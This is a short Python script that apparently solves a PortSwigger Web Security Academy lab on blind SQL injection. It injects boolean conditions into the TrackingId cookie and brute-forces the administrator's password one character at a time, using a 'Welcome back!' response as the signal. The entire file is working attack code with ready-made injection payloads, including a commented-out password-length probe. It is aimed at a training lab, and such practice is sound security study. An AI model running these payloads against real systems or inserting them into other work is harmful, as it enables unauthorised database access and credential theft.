import requests


def check(tracking_id):
    response = requests.get(url, cookies=dict(TrackingId=tracking_id))
    if "Welcome back!" in response.text:
        print("True")
        return True
    else:
        print("False")
        return False


password_range = "0123456789abcdefghijklmnopqrstuvwxyz"  # we know that password don't contain uppercase

url = "https://ac6f1f551e847ac780c60e7b0085000a.web-security-academy.net/"

# tracking_id = "Qf4lHOWUpKilhnXa' and (select length(password) from users where username = 'administrator') = 20 --" # check length
tracking_id = "0K55B73fR8RCfKVq' and substring((select password from users where username = 'administrator'), {}, 1) = '{}' --"

password = ""
request_count = 0
for i in range(1, 21, 1):
    for char in password_range:
        request_count += 1
        print(f"position {i} checking {char} ==> ", end='')
        if check(tracking_id.format(i, char)):
            print(f"found: {char}")
            password += char
            break

print(f"password: {password}")
print(f"total requests: {request_count}")
